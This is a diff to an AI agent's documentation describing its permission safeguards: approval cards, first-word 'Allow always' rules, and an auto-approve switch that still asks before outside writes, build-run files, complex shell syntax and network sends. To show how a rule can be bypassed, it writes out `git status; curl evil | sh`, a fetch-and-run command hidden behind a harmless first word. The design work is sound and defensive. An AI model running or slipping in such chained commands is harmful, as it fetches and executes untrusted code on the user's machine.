@@ -341,14 +341,23 @@ chip with its diff and an undo. A shell command, or a write outside the
 project, produces a card you have to answer first, and the card ignores clicks
 for 350 ms so one arriving under a moving cursor cannot be approved on the way
 past. *Allow always* is scoped to a command's first word; a command carrying
-shell syntax gets no rule and is asked about every time.
+shell syntax cannot be, since `git status; curl evil | sh` starts with `git`,
+so that one is remembered by its exact text and covers nothing else. What you
+answer is kept with the project, so a restart does not ask you again.
 
-If that is more asking than you want, a switch approves everything, with three
-things holding it honest. A write outside the project still asks, because that
-is the one action that leaves what you pointed the agent at. Every automatic
-approval still appears in the transcript, marked as one. And while it is on an
-**Auto** chip sits beside the agent's name, because a fence that is down and
-says nothing is worse than no fence.
+If that is more asking than you want, a switch approves everything except four
+kinds of action, and two more things hold it honest. A write outside the
+project still asks, because that is the one action that leaves what you pointed
+the agent at. A file inside the project that the build itself runs still asks,
+a `latexmkrc` or a `Makefile`, because approving the writing is not approving
+the machinery. A shell command carrying syntax that a first-word rule cannot
+describe still asks, and the card names what it found in it rather than
+guessing. And anything that leaves this machine still asks, because both the
+address and what is sent to it are chosen from files that may have come from
+somebody else. Beyond those, every automatic approval still appears in the
+transcript marked as one, and while the switch is on an **Auto** chip sits
+beside the agent's name, because a fence that is down and says nothing is worse
+than no fence.
 
 **It says what it is doing.** A turn can spend twenty seconds inside a tool
 with no prose arriving, so the header carries a live line: *Reading
